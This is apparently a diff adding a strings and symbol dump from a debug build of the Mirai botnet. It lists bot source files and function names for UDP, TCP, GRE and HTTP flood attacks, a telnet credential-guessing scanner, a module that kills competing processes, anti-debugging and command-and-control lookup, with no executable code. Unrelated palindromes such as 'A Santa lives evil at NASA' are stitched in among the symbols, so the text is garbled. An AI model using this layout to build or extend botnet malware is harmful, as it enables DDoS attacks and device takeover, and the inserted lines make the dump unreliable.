+p!iac_wont
+tmp1
+tmp2
+consume_any_prompt
+consume_user_prompt
+consume_pass_prompt
+consume_resp_prompt
+tkn_resp
+add_auth_entry
+"enc_user
+"enc_pass
+"weight
+random_auth_entry
+report_working
+"daddr
+"dport
+P"auth
+addr
+entries
+zero
+deobf
+"str
+"len
+can_consume
+"ptr
+"amount
+outptr
+#LOCAL_ADDR
+#scanner_pid
+#rsck
+#rsck_out
+#auth_table_len
+#scanner_rawpkt
+#auth_table
+#conn_table
+#auth_table_max_weight
+#fake_time
+GNU C 4.1.2
+bot/table.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__gnuc_va_list
+uint8_t
+uint16_t
+uint32_t
+va_list
+BOOL
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+	arp
+table_value
+val_len
+locked
+table_init
+table_unlock_val
+d	val
+table_lock_val
+d	val
+table_retrieve_val
+	val
+add_entry
+buf_len
+	cpy
+toggle_obf
+l	val
+p	k1
+t	k2
+u	k3
+v	k4
+	outptr
+LOCAL_ADDR
+table_key
+table
+GNU C 4.1.2
+bot/util.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__socklen_t
+__gnuc_va_list
+uint16_t
+uint32_t
+socklen_t
+sa_family_t
+sockaddr_in
+W	sin_family
+	sin_port
+	sin_addr
+	sin_zero
+in_port_t
+in_addr_t
+in_addr
+	s_addr
+va_list
+BOOL
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+util_strlen
+util_strncmp
+str1
+str2
+util_strcmp
+str1
+str2
+util_strcpy
+util_memcpy
+r_dst
+r_src
+util_zero
+zero
+util_atoi
+base
+cutoff
+cutlim
+util_itoa
+value
+radix
+string
+scratch
+offset
+accum
+util_memsearch
+buf_len
+mem_len
+matched
+util_stristr
+haystack
+haystack_len
+str_len
+match_count
+util_local_addr
+addr
+addr_len
+util_fdgets
+buffer
+buffer_size
+total
+util_isupper
+util_isalpha
+util_isspace
+util_isdigit
+outptr
+LOCAL_ADDR
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+includes.h
+attack.c
+stdarg.h
+stdint.h
+attack.h
+socket.h
+in.h
+sockaddr.h
+01g/
+Y1hg
+"Y1j
+Z1yuw
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+includes.h
+attack_app.c
+stdarg.h
+stdint.h
+attack.h
+socket.h
+in.h
+sockaddr.h
+select.h
+time.h
+types.h
+unistd.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+/etc/xcompile/i586/bin/../include/linux
+/etc/xcompile/i586/bin/../include/asm-generic
+includes.h
+attack_gre.c
+stdarg.h
+stdint.h
+attack.h
+socket.h
+in.h
+sockaddr.h
+ip.h
+int-ll64.h
+types.h
+protocol.h
+udp.h
+Borrow or rob
+if_ether.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+/etc/xcompile/i586/bin/../include/linux
+/etc/xcompile/i586/bin/../include/asm-generic
+includes.h
+attack_tcp.c
+stdarg.h
+stdint.h
+attack.h
+socket.h
+in.h
+sockaddr.h
+ip.h
+int-ll64.h
+types.h
+Eleele
+tcp.h
+unistd.h
+types.h
+time.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+/etc/xcompile/i586/bin/../include/linux
+/etc/xcompile/i586/bin/../include/asm-generic
+includes.h
+attack_udp.c
+stdarg.h
+stdint.h
+attack.h
+socket.h
+in.h
+sockaddr.h
+ip.h
+int-ll64.h
+types.h
+udp.h
+protocol.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/linux
+/etc/xcompile/i586/bin/../include/asm-generic
+includes.h
+checksum.c
+stdarg.h
+stdint.h
+ip.h
+int-ll64.h
+types.h
+01g/
+Y1hg
+KFmg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+includes.h
+killer.c
+stdarg.h
+stdint.h
+socket.h
+in.h
+sockaddr.h
+dirent.h
+dirent.h
+types.h
+01g/
+Y1hg
+gZgy
+!Kh/;
+uKL0
+I2g>
+fhi/;
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include/bits
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+includes.h
+main.c
+stdarg.h
+siginfo.h
+types.h
+sigaction.h
+signal.h
+sigset.h
+select.h
+time.h
+stdint.h
+socket.h
+in.h
+sockaddr.h
+unistd.h
+resolv.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+includes.h
+rand.c
+stdarg.h
+stdint.h
+01g/
+Y1hg
+Y1K0h
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+includes.h
+resolv.c
+stdarg.h
+stdint.h
+resolv.h
+protocol.h
+socket.h
+in.h
+sockaddr.h
+select.h
+time.h
+types.h
+01g/
+Y1hg
+g1gu
+1uuuu
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/linux
+/etc/xcompile/i586/bin/../include/asm-generic
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/bits
+/etc/xcompile/i586/bin/../include/netinet
+includes.h
+scanner.c
+stdarg.h
+stdint.h
+ip.h
+int-ll64.h
+types.h
+tcp.h
+select.h
+scanner.h
+time.h
+types.h
+socket.h
+in.h
+sockaddr.h
+unistd.h
+resolv.h
+01g/
+Y1hg
+1guu
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+includes.h
+table.c
+stdarg.h
+stdint.h
+table.h
+01g/
+Y1hg
+/etc/xcompile/i586/bin/../gcc/include
+/etc/xcompile/i586/bin/../include
+/etc/xcompile/i586/bin/../include/sys
+/etc/xcompile/i586/bin/../include/netinet
+/etc/xcompile/i586/bin/../include/bits
+includes.h
+util.c
+stdarg.h
+stdint.h
+socket.h
+in.h
+sockaddr.h
+socket.h
+types.h
+01g/
+Y1hg
+.gv/;
+Z=1ggg/
+1gg/
+1gww
+g==1gg
+5ui0
+=ghL
+s. T.
+. p.
+. S.
+. r.
+. b.
+	. P.
+. i.
+. U.
+. b.
+. U.
+. b.
+. U.
+. U.
+. U.
+X. Y.
+. U.
+. U.
+d. U.
+. Q.
+z. a.
+o. U.
+. Y.
+. T.
+. T.
+n. U.
+. P.
+. e.
+targs_len
+unsigned int
+opts
+opts_len
+vector
+duration
+targs_len
+generic_memes
+dst_addr
+offset
+user_agent
+fdset_wr
+postdata
+last_recv
+unsigned int
+last_send
+opts_len
+http_table
+fdset_rd
+nl_off
+domain
+__result
+fake_time
+targs_len
+data_len
+source_ip
+dont_frag
+protocol
+unsigned int
+opts_len
+greiph
+ip_ident
+data_rand
+targs_len
+data_len
+source_ip
+ack_fl
+syn_fl
+dont_frag
+unsigned int
+urg_fl
+rst_fl
+opts_len
+fin_fl
+ip_ident
+ip_tos
+tcph
+psh_fl
+dport
+ip_ttl
+data_rand
+targs_len
+data_len
+targs
+udph
+dont_frag
+unsigned int
+opts_len
+ip_ident
+ip_tos
+sport
+dport
+ip_ttl
+data_rand
+unsigned int
+ptr_path
+unsigned int
+unsigned int
+si_sigval
+si_uid
+si_pid
+__result
+unsigned int
+unsigned int
+conn
+tmp_str
+tmp_len
+prompt_ending
+consumed
+unsigned int
+__result
+unsigned int
+unsigned int
+.symtab
+.strtab
+.shstrtab
+.init
+.text
+.fini
+.rodata
+.eh_frame
+.ctors
+.dtors
+.jcr
+.got.plt
+.data
+.bss
+.comment
+.debug_aranges
+.debug_pubnames
+.debug_info
+.debug_abbrev
+.debug_line
+.debug_frame
+.debug_str
+.debug_loc
+.debug_ranges
+libc/sysdeps/linux/i386/crti.S
+crtstuff.c
+__CTOR_LIST__
+__DTOR_LIST__
+__EH_FRAME_BEGIN__
+__JCR_LIST__
+completed.2429
+p.2427
+A Santa lives evil at NASA
+__do_global_dtors_aux
+object.2482
+frame_dummy
+__CTOR_END__
+__DTOR_END__
+__FRAME_END__
+__JCR_END__
+__do_global_ctors_aux
+initfini.c
+libc/sysdeps/linux/i386/crtn.S
+libc/sysdeps/linux/i386/crt1.S
+attack.c
+xputc
+outptr
+xputs
+xvprintf
+xprintf
+add_attack
+free_opts
+attack_app.c
+attack_gre.c
+attack_tcp.c
+attack_udp.c
+get_dns_resolver
+checksum.c
+killer.c
+has_exe_access
+memory_scan_match
+mem_exists
+main.c
+segv_handler
+unlock_tbl_if_nodebug
+anti_gdb_entry
+ensure_single_instance
+establish_connection
+Do nine men interpret Nine men I nod
+teardown_connection
+resolve_cnc_addr
+local_bind.5194
+C.115.5274
+rand.c
+resolv.c
+resolv_skip_name
+scanner.c
+add_auth_entry
+setup_connection
+random_auth_entry
+consume_iacs
+consume_user_prompt
+consume_pass_prompt
+consume_any_prompt
+consume_resp_prompt
+report_working
+get_random_ip
+can_consume
+deobf
+table.c
+add_entry
+toggle_obf
+util.c
+util_isspace
+util_isdigit
+util_isalpha
+util_isupper
+sigaction.c
+__restore_rt
+__restore
+__syscall_fcntl.c
+__syscall_fcntl64.c
+__syscall_rt_sigaction.c
+close.c
+fork.c
+getpid.c
+getppid.c
+kill.c
+open.c
+prctl.c
+read.c
+readlink.c
+select.c
+time.c
+unlink.c
+write.c
+closedir.c
+opendir.c
+readdir.c
+__errno_location.c
+clock.c
+perror.c
+fprintf.c
+_stdio.c
+_stdio_streams
+__stdio_mutex_initializer.3991
+_fixed_buffers
+_wcommit.c
+vfprintf.c
+_vfprintf_internal.c
+_charpad
+_fp_out_narrow
+spec_base.4201
+prefix.4202
+_ppfs_init.c
+_ppfs_prepargs.c
+_ppfs_setargs.c
+_ppfs_parsespec.c
+_promoted_size
+type_codes
+type_sizes
+spec_flags.4203
+qual_chars.4208
+spec_chars.4204
+spec_ranges.4205
+spec_or_mask.4206
+spec_and_mask.4207
+fputs_unlocked.c
+fwrite_unlocked.c
+memcpy.c
+memmove.c
+memset.c
+strlen.c
+strnlen.c
+__glibc_strerror_r.c
+__xpg_strerror_r.c
+unknown.1161
+_string_syserrmsgs.c
+isatty.c
+tcgetattr.c
+ntohl.c
+inet_makeaddr.c
+accept.c
+bind.c
+connect.c
+getsockname.c
+getsockopt.c
+listen.c
+recv.c
+recvfrom.c
+send.c
+sendto.c
+setsockopt.c
+socket.c
+sigempty.c
+malloc.c
+__malloc_largebin_index
+calloc.c
+realloc.c
+free.c
+__malloc_trim
+abort.c
+mylock
+been_there_done_that
+atol.c
+strtol.c
+_stdlib_strto_l.c
+exit.c
+sleep.c
+sysconf.c
+__uClibc_main.c
+__pthread_return_0
+__pthread_return_void
+__check_one_fd
+been_there_done_that.2832
+libc/sysdeps/linux/i386/mmap.S
+__socketcall.c
+_exit.c
+clock_getres.c
+fstat.c
+getdents.c
+getdents64.c
+getdtablesize.c
+getegid.c
+geteuid.c
+getgid.c
+getpagesize.c
+getrlimit.c
+getuid.c
+ioctl.c
+llseek.c
+mremap.c
+munmap.c
+nanosleep.c
+sbrk.c
+sigprocmask.c
+times.c
+xstatconv.c
+__C_ctype_b.c
+errno.c
+wcrtomb.c
+wcsrtombs.c
+wcsnrtombs.c
+_WRITE.c
+_fwrite.c
+_trans2w.c
+_load_inttype.c
+_store_inttype.c
+_uintmaxtostr.c
+_fpmaxtostr.c
+exp10_table
+memchr.c
+mempcpy.c
+memrchr.c
+inet_aton.c
+raise.c
+sigsetops.c
+dl-support.c
+brk.c
+__syscall_error.c
+fseeko.c
+fseeko64.c
+_adjust_pos.c
+_cs_funcs.c
+__fini_array_end
+__fini_array_start
+__init_array_end
+__preinit_array_end
+_GLOBAL_OFFSET_TABLE_
+__init_array_start
+__preinit_array_start
+__libc_sigaction
+__GI_fcntl64
+__socketcall
+__GI___ctype_b
+__GI_memchr
+__GI___glibc_strerror_r
+conn_table
+getrlimit
+ioctl
+_stdio_openlist_use_count
+__GI_sigaction
+__GI_time
+getgid
+sysconf
+stdout
+__GI_getpagesize
+getdtablesize
+__GI_h_errno
+attack_gre_eth
+recv
+attack_udp_generic
+connect
+__GI___uClibc_fini
+sigemptyset
+__pthread_mutex_lock
+__sigdelset
+util_stristr
+__GI_clock_getres
+__uClibc_fini
+memrchr
+geteuid
+__getdents
+memmove
+munmap
+__GI_setsockopt
+__libc_stack_end
+__GI_wcsnrtombs
+_uintmaxtostr
+__libc_fcntl
+atol
+_h_errno
+times
+__ctype_b
+rsck
+resolv_domain_to_hostname
+errno
+getegid
+__GI_sbrk
+__libc_accept
+__GI___uClibc_init
+attack_udp_plain
+attack_udp_vse
+getpagesize
+getpid
+util_strncmp
+__GI_lseek64
+__libc_getpid
+util_fdgets
+__xpg_strerror_r
+fcntl64
+attack_get_opt_ip
+prctl
+attack_tcp_ack
+memcpy
+__GI_fputs_unlocked
+perror
+creat
+rand_init
+readlink
+__libc_select
+recv_strip_null
+_ppfs_init
+__libc_nanosleep
+__pthread_mutex_init
+getuid
+malloc
+isatty
+table_unlock_val
+sleep
+__GI_atol
+__GI_read
+recvfrom
+__dso_handle
+__GI_readdir
+clock_getres
+socket
+select
+_pthread_cleanup_pop_restore
+__GI_wcrtomb
+readdir
+__GI___libc_fcntl
+__GI_memset
+__GI_closedir
+__GI_accept
+__stdio_seek
+mempcpy
+util_atoi
+__GI_write
+util_memsearch
+__libc_read
+__GI_opendir
+attack_kill_all
+_string_syserrmsgs
+__GI_open
+__GI_tcgetattr
+__environ
+resolve_func
+mmap
+wcsnrtombs
+send
+abort
+killer_realpath_len
+__GI_fcntl
+__GI_wcsrtombs
+__GI_fwrite_unlocked
+__GI_getgid
+killer_realpath
+_init
+strtol
+__libc_lseek64
+strnlen
+__GI_mempcpy
+accept
+__malloc_state
+__GI___C_ctype_b_data
+resolv_lookup
+table
+scanner_kill
+__sigaddset
+nanosleep
+__GI_send
+h_errno
+calloc
+attack_ongoing
+__pthread_mutex_unlock
+__register_frame_info_bases
+__GI_exit
+__app_fini
+attack_init
+__exit_cleanup
+write
+environ
+__GI_close
+fstat
+methods
+fprintf
+kill
+fputs_unlocked
+__pthread_mutex_trylock
+__GI_brk
+bind
+__GI_nanosleep
+alula
+LOCAL_ADDR
+_stdio_openlist
+__GI_sigprocmask
+inet_addr
+ntohl
+__GI_fseek
+util_strlen
+util_zero
+fseeko
+_stdio_openlist_del_count
+__raise
+setsockopt
+__GI_times
+fseek
+mremap
+__GI_kill
+__GI_memmove
+memchr
+__pthread_initialize_minimal
+__GI_recv
+__stdin
+stdin
+__GI_isatty
+_start
+__deregister_frame_info_bases
+__GI_ioctl
+rand_str
+read
+attack_tcp_stomp
+__xstat64_conv
+__GI_memcpy
+table_retrieve_val
+wcsrtombs
+_stdio_user_locking
+unlink
+htonl
+sendto
+__GI___C_ctype_b
+scanner_init
+table_key
+realloc
+__libc_send
+__GI___xpg_strerror_r
+killer_init
+__GI_recvfrom
+__GI_getrlimit
+listen
+__stdio_adjust_position
+attack_start
+malloc_trim
+_vfprintf_internal
+fork
+rand_next
+__GI_sleep
+sigaction
+_dl_phdr
+__GI___libc_fcntl64
+__uClibc_init
+__GI_munmap
+_store_inttype
+__getpagesize
+__GI_mremap
+attack_udp_dns
+__syscall_error
+__uclibc_progname
+__GI_getegid
+__malloc_lock
+__uClibc_main
+sbrk
+__rtld_fini
+__GI_fork
+__libc_close
+__GI_getpid
+inet_aton
+util_memcpy
+_pthread_cleanup_push_defer
+__sigismember
+__bss_start
+__libc_open
+resolv_entries_free
+memset
+scanner_pid
+__GI_socket
+main
+__glibc_strerror_r
+srv_addr
+util_local_addr
+__stdio_fwrite
+table_lock_val
+attack_app_cfnull
+__syscall_rt_sigaction
+__xstat_conv
+ntohs
+getppid
+tcgetattr
+__libc_recvfrom
+time
+opendir
+checksum_generic
+__GI_abort
+__GI_fprintf
+__stdio_init_mutex
+__GI__exit
+attack_parse
+data_start
+__GI_sysconf
+__h_errno_location
+__C_ctype_b_data
+fd_serv
+util_itoa
+_fini
+attack_tcp_syn
+__GI_mmap
+__get_pc_thunk_bx
+strerror_r
+__GI_select
+attack_app_http
+_stdio_term
+__GI_vfprintf
+stderr
+attack_get_opt_int
+killer_kill_by_port
+attack_app_proxy
+__C_ctype_b
+_ppfs_setargs
+__GI_sendto
+__GI_sigemptyset
+__libc_fork
+__atexit_lock
+attack_gre_ip
+auth_table_max_weight
+killer_kill
+util_strcmp
+__libc_fcntl64
+getsockopt
+__GI_fseeko64
+__stdio_wcommit
+attack_get_opt_str
+__GI_unlink
+killer_pid
+fwrite_unlocked
+__pagesize
+_stdio_openlist_add_lock
+methods_len
+__GI_getdtablesize
+_edata
+__stdout
+__GI_memrchr
+__GI_fstat
+_end
+__GI_listen
+htons
+util_strcpy
+_ppfs_prepargs
+__GI_connect
+__curbrk
+__GI_readlink
+_dl_phnum
+_fpmaxtostr
+scanner_rawpkt
+__errno_location
+pending_connection
+_stdlib_strto_l
+__GI___libc_open
+exit
+__stdio_WRITE
+_stdio_init
+__GI_geteuid
+auth_table_len
+checksum_tcpudp
+_dl_aux_init
+table_init
+__GI_perror
+_errno
+atoi
+fd_ctrl
+_stdio_openlist_del_lock
+__GI_inet_aton
+__GI_bind
+auth_table
+_exit
+__libc_recv
+__getdents64
+__libc_creat
+strlen
+lseek64
+open
+__libc_write
+__malloc_consolidate
+_ppfs_parsespec
+__GI_strtol
+__GI_getuid
+clock
+__GI_errno
+__libc_sendto
+__stdio_trans2w_o
+fake_time
+__GI_raise
+__data_start
+__GI_inet_addr
+closedir
+__GI_strnlen
+_Jv_RegisterClasses
+__GI___errno_location
+fcntl
+rsck_out
+__GI_atoi
+fseeko64
+wcrtomb
+__GI_getsockname
+close
+rand_alphastr
+__libc_connect
+__GI_strlen
+vfprintf
+_load_inttype
+raise
+free
+sigprocmask
+getsockname
